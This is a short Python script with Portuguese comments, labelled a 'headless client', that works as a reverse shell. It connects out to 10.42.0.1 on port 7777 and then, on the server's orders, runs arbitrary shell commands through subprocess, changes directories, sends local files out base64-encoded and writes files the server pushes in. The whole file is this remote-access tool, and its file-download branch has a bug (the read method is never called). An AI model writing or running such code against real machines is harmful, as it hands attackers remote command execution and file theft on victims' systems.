####################################################
# Cliente headless
####################################################
import socket
import os
import subprocess
import base64

# função shell feedback da existente no server. Não mostra nada.
def shell():
    current_dir = os.getcwd()
    print("-----------------------------------------")
    print("Current dir:",current_dir)
    print("Client type:", type(client),"->",id(client))
    client.send(current_dir.encode())
    while True:
        res=client.recv(1024).decode().rstrip()
        print("Resposta:",res)
        if res == "exit": # Saida do app
            print("Exit:",res)
            break
        elif res[:2]=="cd" and len(res) > 2: #seção de mudança de diretório
            print("Res:", res[3:])
            os.chdir(res[3:])
            result = os.getcwd()
            client.send(result.encode())
        elif res[:8]=="download": # descarregar um arquivo
            with open(res[9:],'rb') as file_download:
                client.send(base64.b64encode(file_download.read))
        elif res[:6]=="upload": # enviar um arquivo
            with open(res[7:],'wb') as file_upload:
                data=client.recv(30000) # preparar buffer de recepção
                file_upload.write(base64.b64decode(data))
        else: # manter o shell ativo no server
            proc=subprocess.Popen(res,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result=proc.stdout.read()+proc.stderr.read()
            if len(result) == 0:
                client.send("1".encode())
            else:
                client.send(result)

client=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # criar um socket
client.connect(('10.42.0.1',7777)) # usar o socket para escutar na porta 7777
shell() # chamada da função shell
client.close() # encerramento do programa
